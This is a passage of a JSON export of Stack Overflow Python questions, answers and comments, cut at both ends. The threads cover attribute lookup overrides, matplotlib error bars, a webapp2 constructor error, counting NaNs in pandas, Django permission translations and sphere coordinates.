{"reputation": 68674, "user_id": 41316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e2c31ca37c09ab42763f690e0d1355d7?s=128&d=identicon&r=PG", "display_name": "bruno desthuilliers", "link": "https://stackoverflow.com/users/41316/bruno-desthuilliers"}, "reply_to_user": {"reputation": 185, "user_id": 2100826, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b2ca439723447a5140db679c94b6eeae?s=128&d=identicon&r=PG", "display_name": "user2100826", "link": "https://stackoverflow.com/users/2100826/user2100826"}, "edited": false, "score": 0, "creation_date": 1427921085, "post_id": 29400014, "comment_id": 46976726, "body": "&quot;because <code>__getattribute__</code> raises an AttributeError, that error means Python no longer looks for whether <code>__dict__</code> exists&quot; =&gt; Yes, that&#39;s <i>exactly</i> the point."}], "tags": [], "owner": {"reputation": 68674, "user_id": 41316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e2c31ca37c09ab42763f690e0d1355d7?s=128&d=identicon&r=PG", "display_name": "bruno desthuilliers", "link": "https://stackoverflow.com/users/41316/bruno-desthuilliers"}, "is_accepted": true, "score": 2, "last_activity_date": 1427920601, "last_edit_date": 1427920601, "creation_date": 1427919690, "answer_id": 29400014, "question_id": 29399161, "link": "https://stackoverflow.com/questions/29399161/python-3-4-getattr-being-called-for-attributes-that-should-exist/29400014#29400014", "title": "Python 3.4 __getattr__ being called for attributes that (should?) exist", "body": "<p>You're overriding <code>__getattribute__</code> - which is the default implementation for attribute lookup - in such a way that it raises a <code>NameError</code> when looking up <code>__dict__</code>. This triggers the call to <code>__getattr__</code>, which in turn raises an <code>AttributeError</code>. The result is <em>exactly</em> what you actually asked for (if not what you expected). </p>\n\n<p>FWIW:</p>\n\n<ol>\n<li>as a general rule, don't use <code>eval(\"self.%s\" % name)</code>, use <code>getattr(obj, name)</code></li>\n<li>don't override <code>__getattribute__</code> (nor<code>__setattr__</code>) unless you <em>really</em> understand what you're doing</li>\n<li>if you really <em>have</em> to override them (hint: there are very very very few reasons to do so), delegate to the default implementation (using <code>super()</code>).</li>\n</ol>\n\n<p>Also: the code you posted doesn't work \"as is\" in Python 2.7 (the call to <code>self._d.__setattr__</code> raises an AttributeError, and making <code>DB</code> a new-style class breaks in exactly the same way as in Python 3.x. </p>\n"}], "owner": {"reputation": 185, "user_id": 2100826, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b2ca439723447a5140db679c94b6eeae?s=128&d=identicon&r=PG", "display_name": "user2100826", "link": "https://stackoverflow.com/users/2100826/user2100826"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 404, "favorite_count": 2, "accepted_answer_id": 29400014, "answer_count": 1, "score": 3, "last_activity_date": 1427921574, "creation_date": 1427916359, "last_edit_date": 1495541659, "question_id": 29399161, "link": "https://stackoverflow.com/questions/29399161/python-3-4-getattr-being-called-for-attributes-that-should-exist", "title": "Python 3.4 __getattr__ being called for attributes that (should?) exist", "body": "<p>I have the following class which is meant to imitate a <code>dict</code> without actually being a subclass:</p>\n\n<pre><code>class DB:\n\n    def __getattribute__(self, name):\n        print('__getattribute__(\"%s\")' % name)\n        if name.startswith('__') and name not in ['__init__', '__new__',\n                '__dict__', '__getattribute__', '__getattr__', '__setattr__',\n                '__delattr__', '__doc__', '__module__', '__del__', '__hash__']:\n            return eval('self._d.%s' % name)\n        print('it is not being diverted to self._d')\n        raise AttributeError(name)\n\n    def __getattr__(self, name):\n        print('__getattr__(\"%s\")' % name)\n        if name.startswith('__'):\n            raise AttributeError(name)\n        return eval('self._d.%s' % name)\n\n    def __setattr__(self, name, val):\n        if name == '_d':\n            self.__dict__[name] = val\n        else:\n            return self._d.__setattr__(name, val)\n\n    def __delattr__(self, name):\n        if name == '_d':\n            del self.__dict__[name]\n        else:\n            return self._d.__delattr__(name)\n\n    def __init__(self):\n        self._d = {}\n</code></pre>\n\n<p>This produces the following output when used:</p>\n\n<pre><code>&gt;&gt;&gt; d = DB()\n__getattribute__(\"__dict__\")\nit is not being diverted to self._d\n__getattr__(\"__dict__\")\nTraceback (most recent call last):\n  File \"&lt;pyshell#2&gt;\", line 1, in &lt;module&gt;\n    d = DB()\n  File \"&lt;pyshell#1&gt;\", line 31, in __init__\n    self._d = {}\n  File \"&lt;pyshell#1&gt;\", line 20, in __setattr__\n    self.__dict__[name] = val\n  File \"&lt;pyshell#1&gt;\", line 15, in __getattr__\n    raise AttributeError(name)\nAttributeError: __dict__\n</code></pre>\n\n<p>Shouldn't it never get to <code>__getattr__(\"__dict__\")</code>, since <code>self.__dict__</code> should already exist by virtue of this being an object?</p>\n\n<p>I have been using this object (well, an essentially identical object) successfully in a program I have been using for several months in Python 2.6 and am trying to upgrade to Python 3.4. According to everything I can find online, Python 3 should be treating this the same as Python 2.</p>\n\n<p><em>Edit:</em> Similar to <a href=\"https://stackoverflow.com/questions/20430637\">this other question</a> but that question deals with <code>__getattr__</code> not being called at all. Both are apparently related to new-style vs. old-style classes, though.</p>\n"}, {"tags": ["python", "matplotlib", "plot", "error-handling"], "comments": [{"owner": {"reputation": 16325, "user_id": 1071311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a12e5cc9a7d9b52960f14c7560de773e?s=128&d=identicon&r=PG", "display_name": "Carsten", "link": "https://stackoverflow.com/users/1071311/carsten"}, "edited": false, "score": 2, "creation_date": 1427916516, "post_id": 29398996, "comment_id": 46974216, "body": "Have you <a href=\"http://matplotlib.org/1.4.2/examples/pylab_examples/errorbar_limits.html\" rel=\"nofollow noreferrer\">looked at the examples</a>? And by the way, what would half an error bar even mean? Do you imply a gaussian with a symmetric error on the other side? is the data point a lower/upper bound with some sort of uncertainty on one side?"}, {"owner": {"reputation": 31, "user_id": 4739673, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/757453ab4a3ca8d9b477357a2308ff71?s=128&d=identicon&r=PG&f=1", "display_name": "student998", "link": "https://stackoverflow.com/users/4739673/student998"}, "reply_to_user": {"reputation": 16325, "user_id": 1071311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a12e5cc9a7d9b52960f14c7560de773e?s=128&d=identicon&r=PG", "display_name": "Carsten", "link": "https://stackoverflow.com/users/1071311/carsten"}, "edited": false, "score": 0, "creation_date": 1427917192, "post_id": 29398996, "comment_id": 46974584, "body": "Yes I&#39;ve checked those out - half an error bar means I&#39;d only want the top portion or the bottom portion given my error bars are symmetrical.  The data are scattered points and i only have 5 categories for the x axis so the errors are running into each other.  I&#39;d like to display only the upper  or lower errors.  I tried changing the uplims parameter from the default False to True and the same with the lolims parameter but either way I still get the other half of the error bar."}, {"owner": {"reputation": 8191, "user_id": 8881141, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/C3ydX.jpg?s=128&g=1", "display_name": "Mr. T", "link": "https://stackoverflow.com/users/8881141/mr-t"}, "edited": false, "score": 0, "creation_date": 1609662606, "post_id": 29398996, "comment_id": 115888166, "body": "Does this answer your question? <a href=\"https://stackoverflow.com/questions/13312820/how-do-i-plot-just-the-positive-error-bar-with-pyplot-bar\">How do I plot just the positive error bar with pyplot.bar?</a>"}], "answers": [{"comments": [{"owner": {"reputation": 24982, "user_id": 2069812, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/3b9968835eb719e5d78a04ba7a2bafbd?s=128&d=identicon&r=PG", "display_name": "Jeef", "link": "https://stackoverflow.com/users/2069812/jeef"}, "edited": false, "score": 3, "creation_date": 1496948793, "post_id": 29416282, "comment_id": 75885020, "body": "You should mark this answer as the correct aster if it solved your problem"}], "tags": [], "owner": {"reputation": 4730, "user_id": 4524746, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/O45fL.jpg?s=128&g=1", "display_name": "jonchar", "link": "https://stackoverflow.com/users/4524746/jonchar"}, "is_accepted": false, "score": 7, "last_activity_date": 1427987156, "creation_date": 1427987156, "answer_id": 29416282, "question_id": 29398996, "link": "https://stackoverflow.com/questions/29398996/how-to-plot-half-error-bars-in-matplotlib/29416282#29416282", "title": "How to plot half error bars in matplotlib?", "body": "<p>When you pass the error bar information to the plotting function using a keyword argument such as <code>yerr</code> you can specify the positive and negative error bars separately as iterables that have the same length as your data. For example if you had 3 points in your scatter plot with x and y values of <code>xdata</code> and <code>ydata</code> respectively, this code would give you positive error bars for each point that had a height of 5:</p>\n\n<pre><code>ax.bar(xdata, ydata, yerr=[(0,0,0), (5,5,5)])\n</code></pre>\n\n<p>Conversely, if you wanted only negative error bars you could do this:</p>\n\n<pre><code>ax.bar(xdata, ydata, yerr=[(5,5,5), (0,0,0)])\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 4739673, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/757453ab4a3ca8d9b477357a2308ff71?s=128&d=identicon&r=PG&f=1", "display_name": "student998", "link": "https://stackoverflow.com/users/4739673/student998"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4378, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1427987156, "creation_date": 1427915776, "question_id": 29398996, "link": "https://stackoverflow.com/questions/29398996/how-to-plot-half-error-bars-in-matplotlib", "title": "How to plot half error bars in matplotlib?", "body": "<p>I have only a few values on my x-axis so my error bars on my data points are competing with each other.  I am not using Excel, rather Python, and would like to know how to plot only the top half or bottom half of the error bars so it's easier to read.  Setting uplims = True does me no good, the bottom half of the error bars are still visible.  </p>\n"}, {"tags": ["python", "google-app-engine", "webapp2"], "comments": [{"owner": {"reputation": 31, "user_id": 4739655, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1ae9132277736aa7e0cf48fc7a078ce0?s=128&d=identicon&r=PG&f=1", "display_name": "Noorhan Abbas", "link": "https://stackoverflow.com/users/4739655/noorhan-abbas"}, "edited": false, "score": 0, "creation_date": 1427915673, "post_id": 29398930, "comment_id": 46973772, "body": "I am using webapp2 request handlers"}, {"owner": {"reputation": 3522, "user_id": 1806019, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/D7C8W.jpg?s=128&g=1", "display_name": "AdrieanKhisbe", "link": "https://stackoverflow.com/users/1806019/adrieankhisbe"}, "edited": false, "score": 0, "creation_date": 1427917479, "post_id": 29398930, "comment_id": 46974737, "body": "wekcome Noorhan, maybe you should add some more details and the interesting part of your code :)"}], "answers": [{"tags": [], "owner": {"reputation": 19646, "user_id": 494074, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/741e480d426fabd85825861bd6481ccd?s=128&d=identicon&r=PG", "display_name": "Ankur Agarwal", "link": "https://stackoverflow.com/users/494074/ankur-agarwal"}, "is_accepted": false, "score": 0, "last_activity_date": 1427918165, "creation_date": 1427918165, "answer_id": 29399647, "question_id": 29398930, "link": "https://stackoverflow.com/questions/29398930/init-takes-exactly-1-argument-3-given-google-appengine/29399647#29399647", "title": "__init__() takes exactly 1 argument (3 given) Google Appengine", "body": "<pre><code>class foo(object):\n\n    def __init__(self, arg1, arg2):\n       blah\n       blah \n</code></pre>\n\n<p><code>__init__</code> takes self by default, so make sure you are only passing the other arguments : arg1 and arg2.</p>\n\n<p>Most likely your class constructor does not need any other arguments but you are passing some arguments to the constructor and hence the error message.</p>\n"}], "owner": {"reputation": 31, "user_id": 4739655, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1ae9132277736aa7e0cf48fc7a078ce0?s=128&d=identicon&r=PG&f=1", "display_name": "Noorhan Abbas", "link": "https://stackoverflow.com/users/4739655/noorhan-abbas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 113, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1427976578, "creation_date": 1427915571, "last_edit_date": 1427976578, "question_id": 29398930, "link": "https://stackoverflow.com/questions/29398930/init-takes-exactly-1-argument-3-given-google-appengine", "title": "__init__() takes exactly 1 argument (3 given) Google Appengine", "body": "<pre><code>class RPCHandler(webapp2.RequestHandler):\n       def __init__(self):\n        webapp2.RequestHandler.__init__(self)\n        self.methods = ConceptsRPCMethods()\n    def get(self):\n        func = None\n        action = self.request.get('action')\n        if action:\n            if action[0] == '_':\n                self.error(403) # access denied\n                return\n            else:\n                func = getattr(self.methods, action, None)\n        if not func:\n            self.error(404) # file not found\n            return\n    else :\n        args = ()\n        while True:\n            key = 'arg%d' % len(args)\n            val = self.request.get(key)\n            if val:\n                args = (json.loads(val),)\n            else:\n                break\n        result = func(*args)\n\n       self.response.out.write(json.dumps(result))\n</code></pre>\n\n<p>I will explain my program more. The problem is when the user clicks on a tree structure, this sends an action (using an XMLHTTPRequest object) to my code using callback function on whether to expand the tree one more level or display information on the page. </p>\n\n<p>So, the above code should receive the required action from the callback function which sends 3 pieces of information (Get method, function, async) so that the ConceptRPCMethods() could handle the requested order. </p>\n\n<p>YAHOO.util.Connect.asyncRequest('GET', '/rpc?' + query,  callback);</p>\n\n<p>I guess I need to make the python code receive 3 parameters but I don't know where to add it or how???</p>\n\n<p>Thanks a lot</p>\n"}, {"tags": ["python", "pandas", "nan"], "comments": [{"owner": {"reputation": 5496, "user_id": 2317751, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lltcO.jpg?s=128&g=1", "display_name": "Liam Foley", "link": "https://stackoverflow.com/users/2317751/liam-foley"}, "edited": false, "score": 3, "creation_date": 1427915623, "post_id": 29398903, "comment_id": 46973748, "body": "df.isnull().sum()    <a href=\"http://stackoverflow.com/questions/26266362/how-to-count-the-nan-values-in-the-column-in-panda-data-frame\" title=\"how to count the nan values in the column in panda data frame\">stackoverflow.com/questions/26266362/&hellip;</a>"}, {"owner": {"reputation": 289239, "user_id": 704848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f9be2c2958e208c8d9b629ac43c9c42?s=128&d=identicon&r=PG", "display_name": "EdChum", "link": "https://stackoverflow.com/users/704848/edchum"}, "edited": false, "score": 0, "creation_date": 1427915933, "post_id": 29398903, "comment_id": 46973902, "body": "Jeez I suddenly gained immediate duplicate close vote"}], "answers": [{"comments": [{"owner": {"reputation": 44364, "user_id": 2487184, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/d8cd1dea84cfe8312c532088a0da08e8?s=128&d=identicon&r=PG", "display_name": "CT Zhu", "link": "https://stackoverflow.com/users/2487184/ct-zhu"}, "edited": false, "score": 1, "creation_date": 1427915724, "post_id": 29398957, "comment_id": 46973800, "body": "beat me to it, btw, I think you can skip the <code>astype(int)</code> part."}, {"owner": {"reputation": 1281, "user_id": 4035480, "user_type": "registered", "accept_rate": 93, "profile_image": "https://graph.facebook.com/731564124/picture?type=large", "display_name": "Josh", "link": "https://stackoverflow.com/users/4035480/josh"}, "edited": false, "score": 0, "creation_date": 1427916647, "post_id": 29398957, "comment_id": 46974297, "body": "thanks for the help!"}], "tags": [], "owner": {"reputation": 289239, "user_id": 704848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f9be2c2958e208c8d9b629ac43c9c42?s=128&d=identicon&r=PG", "display_name": "EdChum", "link": "https://stackoverflow.com/users/704848/edchum"}, "is_accepted": true, "score": 3, "last_activity_date": 1427915806, "last_edit_date": 1427915806, "creation_date": 1427915645, "answer_id": 29398957, "question_id": 29398903, "link": "https://stackoverflow.com/questions/29398903/how-to-get-the-frequency-of-nan-obsevations-in-a-pandas-dataframe-column/29398957#29398957", "title": "How to get the frequency of NaN obsevations in a pandas dataframe column", "body": "<p>If you're looking just to count the <code>NaN</code> values:</p>\n\n<pre><code>In [2]:\n\ndf = pd.DataFrame({'a':[0,1,np.NaN,np.NaN,np.NaN],'b':np.NaN, 'c':[np.NaN,1,2,3,np.NaN]})\ndf\nOut[2]:\n    a   b   c\n0   0 NaN NaN\n1   1 NaN   1\n2 NaN NaN   2\n3 NaN NaN   3\n4 NaN NaN NaN\nIn [6]:\n\ndf.isnull().astype(int).sum()\nOut[6]:\na    3\nb    5\nc    2\ndtype: int64\n</code></pre>\n\n<p><strong>EDIT</strong>\n@CTZhu has pointed out the type casting is unnecessary:</p>\n\n<pre><code>In [7]:\n\ndf.isnull().sum()\nOut[7]:\na    3\nb    5\nc    2\ndtype: int64\n</code></pre>\n"}], "owner": {"reputation": 1281, "user_id": 4035480, "user_type": "registered", "accept_rate": 93, "profile_image": "https://graph.facebook.com/731564124/picture?type=large", "display_name": "Josh", "link": "https://stackoverflow.com/users/4035480/josh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2084, "favorite_count": 1, "closed_date": 1427915877, "accepted_answer_id": 29398957, "answer_count": 1, "score": 1, "last_activity_date": 1427915806, "creation_date": 1427915486, "question_id": 29398903, "link": "https://stackoverflow.com/questions/29398903/how-to-get-the-frequency-of-nan-obsevations-in-a-pandas-dataframe-column", "closed_reason": "Duplicate", "title": "How to get the frequency of NaN obsevations in a pandas dataframe column", "body": "<p>I have a pandas data frame with 83 columns and 4000 rows.  I intend to use the data for a logistic regression and therefore want to narrow down my columns to those that have the least amount of missing data.  </p>\n\n<p>To do this I was thinking of ranking them based on the frequency of NaN observations. I tried a few things like </p>\n\n<pre><code>econ_balance[\"BG.GSR.NFSV.GD.ZS\"].describe()\necon_balance[\"BG.GSR.NFSV.GD.ZS\"].value_counts\necon_balance[\"BG.GSR.NFSV.GD.ZS\"][\"NaN\"]\necon_balance[\"BG.GSR.NFSV.GD.ZS\"][NaN]\n</code></pre>\n\n<p>None of which seem to work. I always tried googling to see if this question has been answered before but no luck.</p>\n\n<p>Thanks in advance for the help</p>\n\n<p>Josh</p>\n"}, {"tags": ["python", "django", "django-modeltranslation"], "comments": [{"owner": {"reputation": 579, "user_id": 3849359, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c58cf6dfa1a8e02aa8e30282b41f9aac?s=128&d=identicon&r=PG&f=1", "display_name": "gabn88", "link": "https://stackoverflow.com/users/3849359/gabn88"}, "edited": false, "score": 0, "creation_date": 1443106005, "post_id": 29398900, "comment_id": 53367803, "body": "Can you elaborate more about you solution in the first part. It might help to understand what you are doing."}], "answers": [{"tags": [], "owner": {"reputation": 675, "user_id": 10651401, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-R80nxuQWRPk/AAAAAAAAAAI/AAAAAAAAAA4/V8LqYPxfvDI/photo.jpg?sz=128", "display_name": "Mahdi Firouzjah", "link": "https://stackoverflow.com/users/10651401/mahdi-firouzjah"}, "is_accepted": false, "score": 0, "last_activity_date": 1615633661, "creation_date": 1615633661, "answer_id": 66612727, "question_id": 29398900, "link": "https://stackoverflow.com/questions/29398900/django-permissions-and-contenttypes-translations/66612727#66612727", "title": "django permissions and contenttypes translations", "body": "<p>I've read your post and also somehow I had the same problem with translation for permissions, I've found a very short way to solve the problem:</p>\n<ul>\n<li>I wouldn't recommend to do this way neither regret that.</li>\n</ul>\n<p>but the solution is:\nedit the <code>app_labeled_name</code> function decorated as <code>property</code> of this path: <code>.pyenv/Lib/site-packages/django/contrib/contenttypes/models.py</code> of <code>ContentType</code> class, to become like this:</p>\n<pre><code>@property\ndef app_labeled_name(self):\n    model = self.model_class()\n    if not model:\n        return self.model\n    return '%s | %s' % (apps.get_app_config(model._meta.app_label).verbose_name,\n                        model._meta.verbose_name)\n</code></pre>\n<p>the trick is to use <code>apps.get_app_config(model._meta.app_label).verbose_name</code> instead of <code>model._meta.app_label</code>, so it would use the same <code>verbose_name</code> as whatever use set for your app in the <code>AppConfig</code> subclass of your app.</p>\n"}], "owner": {"reputation": 2196, "user_id": 1361560, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/76e68e91c8d03609fb2ff9f0a9c46911?s=128&d=identicon&r=PG", "display_name": "brunofitas", "link": "https://stackoverflow.com/users/1361560/brunofitas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1201, "favorite_count": 2, "answer_count": 1, "score": 5, "last_activity_date": 1615633661, "creation_date": 1427915480, "last_edit_date": 1427923123, "question_id": 29398900, "link": "https://stackoverflow.com/questions/29398900/django-permissions-and-contenttypes-translations", "title": "django permissions and contenttypes translations", "body": "<p>I've been using <a href=\"https://github.com/deschler/django-modeltranslation\" rel=\"noreferrer\">django-modeltranslation</a> to translate models in django for a while. It is really straightforward and it works really well on apps I've been developing, where <strong>all model translated content gets inserted with forms</strong> by the final user.</p>\n\n<p><strong>eg</strong>: inputs: content, content_en, content_pt, ...</p>\n\n<p>I have to build an application where I <strong>need to translate 'built-in' model strings</strong> that are generated by django, like 'auth.permission.name' or 'contenttypes.contenttype.name' <strong>and add them to translation django.po files</strong>.</p>\n\n<h1>I came up with a solution that works fine,</h1>\n\n<p>which uses post_migration signals that create a file with lists of ugettext_lazy elements, so new strings, like a new contenttype.name for example, are added to 'django.po' dynamically and loaded to the database. </p>\n\n<h1>Yet, is a bit weird having to create a file with ugettext calls</h1>\n\n<p><strong>in order to register the strings, but I didn't find another way of registering and adding them dynamically to the django.po file, so I need your help</strong></p>\n\n<p><br/>\n<strong>Here's what I have done:</strong></p>\n\n<p><strong>1.</strong> I created an app named 'tools', that is the last one on INSTALLED_APPS, so its migrations are naturally the last ones to be called. This app does not have any models, it just runs migrations, has the django-modeltranslation translation.py file and an application config with a post_migration signal call.</p>\n\n<pre><code># translations.py\n\nfrom modeltranslation.translator import translator, TranslationOptions\nfrom django.contrib.auth.models import Permission\nfrom django.contrib.contenttypes.models import ContentType\n\nclass PermissionTranslationOptions(TranslationOptions):\n    fields = ('name',)\n\nclass ContentTypeTranslationOptions(TranslationOptions):\n    fields = ('name',)\n\ntranslator.register(Permission, PermissionTranslationOptions)\ntranslator.register(ContentType, ContentTypeTranslationOptions)\n</code></pre>\n\n<p><strong>2.</strong> Running '<strong>manage.py makemigrations</strong>' creates the migrations on the 'auth' and 'contenttypes' applications with the extra 'name_*' fields.</p>\n\n<p><strong>3.</strong> the app has an application config that has a post_migrate signal</p>\n\n<pre><code># __init__.py\n\ndefault_app_config = 'apps.tools.config.SystemConfig'\n</code></pre>\n\n<p><br/></p>\n\n<pre><code># config.py\n\nfrom django.apps import AppConfig\nfrom django.db.models.signals import post_migrate\nfrom apps.tools.translations.exporter import make_translations\nfrom apps.tools.translations.importer import load_translations\n\n\ndef run_translations(sender, **kwargs):\n\n    # This creates the translations\n    make_translations()\n\n    # This loads the the translations to the db\n    load_translations()\n\n\nclass SystemConfig(AppConfig):\n\n    name = 'apps.tools'\n    verbose_name = 'Tools'\n\n    def ready(self):\n        # Call post migration operations\n        post_migrate.connect(run_translations, sender=self)\n</code></pre>\n\n<p><strong>4.</strong> make_translations() is called after migrations and generates a file with lists of uggettext_lazy calls.</p>\n\n<p><strong>This is the bit I would like to change. Do I really need to create a file?</strong></p>\n\n<pre><code># exporter\n\nimport os\nfrom django.contrib.auth.models import Permission\nfrom django.contrib.contenttypes.models import ContentType\nfrom django.utils import translation\nfrom django.contrib.contenttypes.management import update_all_contenttypes\n\n\n# TODO \n# It has got to be another way\n\ndef make_translations():\n    # lets go default\n    translation.activate(\"en\")\n    update_all_contenttypes()\n\n    try:\n        f = open(os.path.join(os.path.realpath(os.path.dirname(__file__)), 'translations.py'), 'w')\n\n        # Write file\n        f.write(\"from django.utils.translation import ugettext_lazy as _\\n\\n\")\n\n        # All Permissions to lazy text\n        f.write('permissions = {\\n')\n        for perm in Permission.objects.all().order_by('id'):\n            f.write('    \"'+str(perm.id)+'\": _(\"'+perm.name+'\"),\\n')\n        f.write('}\\n\\n')\n\n        # All Content types to lazy text\n        f.write('content_types = {\\n')\n        for content in ContentType.objects.all().order_by('id'):\n            f.write('    \"'+str(content.id)+'\": _(\"'+content.name+'\"),\\n')\n        f.write('}\\n\\n')\n\n        # Closing file\n        f.close()\n\n        # Importing file to get it registered with ugettext_lazy\n        try:\n            from apps.tools.translations import translations\n        except:\n            print('Could not import file')\n            pass\n    except:\n        print('Could not create file')\n        pass\n</code></pre>\n\n<p>The above results in a file like this:</p>\n\n<pre><code>from django.utils.translation import ugettext_lazy as _\n\npermissions = {\n    \"1\": _(\"Can add permission\"),\n    \"2\": _(\"Can change permission\"),\n    \"3\": _(\"Can delete permission\"),\n    \"4\": _(\"Can add group\"),\n  ...\n}\n\ncontent_types = {\n    \"1\": _(\"group\"),\n    \"2\": _(\"user\"),\n    \"3\": _(\"permission\"),\n    \"4\": _(\"content type\"),\n    \"5\": _(\"session\"),\n  ...\n}\n</code></pre>\n\n<p><strong>5.</strong> Running 'makemessages' would add this strings to 'django.po' files, yet, the post_migration signal does not stop here, and loads the existing compiled strings in the database</p>\n\n<pre><code># importer\n\nfrom django.contrib.auth.models import Permission\nfrom django.contrib.contenttypes.models import ContentType\nfrom django.conf import settings\nfrom django.utils import translation\n\n\ndef load_translations():\n    try:\n        from apps.tools.translations.translations import permissions, content_types\n    except:\n        # File does not exists\n        print('Translations could not be loaded')\n        return\n\n    # For each language\n    for lang in settings.LANGUAGES:\n\n        # Activate language\n        translation.activate(lang[0])\n\n        # Loading translated permissions\n        all_permissions = Permission.objects.all()\n        for permission in all_permissions:\n            permission.name = unicode(permissions[str(permission.id)])\n            permission.save()\n\n        # Loading translated content_types\n        all_contenttypes = ContentType.objects.all()\n        for contenttype in all_contenttypes:\n            contenttype.name = unicode(content_types[str(contenttype.id)])\n            contenttype.save()\n</code></pre>\n\n<h1>How can I replace 'make_translations()' without creating a file and register those strings with ugettext_lazy?</h1>\n\n<p><strong>Thanks for your help</strong></p>\n"}, {"tags": ["python", "computational-geometry"], "comments": [{"owner": {"reputation": 18703, "user_id": 2912340, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/ddQ02.jpg?s=128&g=1", "display_name": "\u0141ukasz Rogalski", "link": "https://stackoverflow.com/users/2912340/%c5%81ukasz-rogalski"}, "edited": false, "score": 0, "creation_date": 1427916094, "post_id": 29398875, "comment_id": 46973973, "body": "Can you show me an example of &#39;sphere point&#39; where all coordinates (x, y, z) and r are integers from ranges defined by you?"}, {"owner": {"reputation": 69452, "user_id": 953482, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/T3HH6.png?s=128&g=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/953482/kevin"}, "edited": false, "score": 1, "creation_date": 1427916309, "post_id": 29398875, "comment_id": 46974086, "body": "This reminds me a bit of an old answer of mine for <a href=\"http://stackoverflow.com/q/7687148/953482\">Drawing Sphere in OpenGL without using gluSphere()?</a>. Maybe it will be useful to you."}, {"owner": {"reputation": 52445, "user_id": 1253222, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3a62746fb04e19c1656cd1df560911f?s=128&d=identicon&r=PG", "display_name": "twalberg", "link": "https://stackoverflow.com/users/1253222/twalberg"}, "edited": false, "score": 0, "creation_date": 1427916934, "post_id": 29398875, "comment_id": 46974453, "body": "I think the biggest problem is your apparent assumption that you will find points on a sphere that have coordinates on a particular grid. Given a centroid on the grid, and a radius that is a multiple of the grid spacing, the vast majority of spheres will only have 8 such points - one in each direction on the radius aligned to each axis through the centroid - the centers of the faces of a grid-aligned bounding cube..."}], "answers": [{"tags": [], "owner": {"reputation": 18703, "user_id": 2912340, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/ddQ02.jpg?s=128&g=1", "display_name": "\u0141ukasz Rogalski", "link": "https://stackoverflow.com/users/2912340/%c5%81ukasz-rogalski"}, "is_accepted": false, "score": 1, "last_activity_date": 1427917106, "last_edit_date": 1427917106, "creation_date": 1427916748, "answer_id": 29399246, "question_id": 29398875, "link": "https://stackoverflow.com/questions/29398875/how-can-i-obtain-the-coordinates-for-a-sphere-using-python/29399246#29399246", "title": "How can I obtain the coordinates for a sphere, using python?", "body": "<p>As I mentioned in comment, I think you are a victim of misunderstanding conditions. My approach would be different - do not iterate over fixed amount of coordinatess and try to hit the spot, but just generate points which are correct. I used common-known spherical to cartesian formulas and just generated fixed samples for both angles. </p>\n\n<pre><code>from __future__ import division\nfrom math import sin, cos, pi\n\nSAMPLES = 20\n\ndef to_x(r, theta, phi):\n    return r*sin(theta)*cos(phi)\n\ndef to_y(r, theta, phi):\n    return r*sin(theta)*sin(phi)\n\ndef to_z(r, theta, phi):\n    return r*cos(theta)\n\nsamples_r = [r for r in xrange(1, 10)]\nsamples_theta = [theta * pi / SAMPLES for theta in xrange(SAMPLES)]\nsamples_phi = [phi * 2*pi / SAMPLES for phi in xrange(SAMPLES)]\n\ncoords = []\n\nfor r in samples_r:\n    for theta in samples_theta:\n        for phi in samples_phi:\n            coords.append((to_x(r, theta, phi), \n                           to_y(r, theta, phi),\n                           to_z(r, theta, phi)))\n\nfor coord in coords:\n   out = open(\"sphere.xyz\", \"a\")\n   print (coord)\n   out.write( \"Ar\"  \" \" \" \" \"%2.5s %2.5s %2.5s \\n\" %(coord))\n   out.close()\n</code></pre>\n\n<p>To improve memory performance you may consider using <a href=\"https://wiki.python.org/moin/Generators\" rel=\"nofollow\">generators</a> and <a href=\"https://docs.python.org/2/library/itertools.html\" rel=\"nofollow\">itertools</a> module (especially <a href=\"https://docs.python.org/2/library/itertools.html#itertools.product\" rel=\"nofollow\">itertools.product</a> seems to be designed for similar problems).</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user4735202"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 730, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1427917106, "creation_date": 1427915412, "question_id": 29398875, "link": 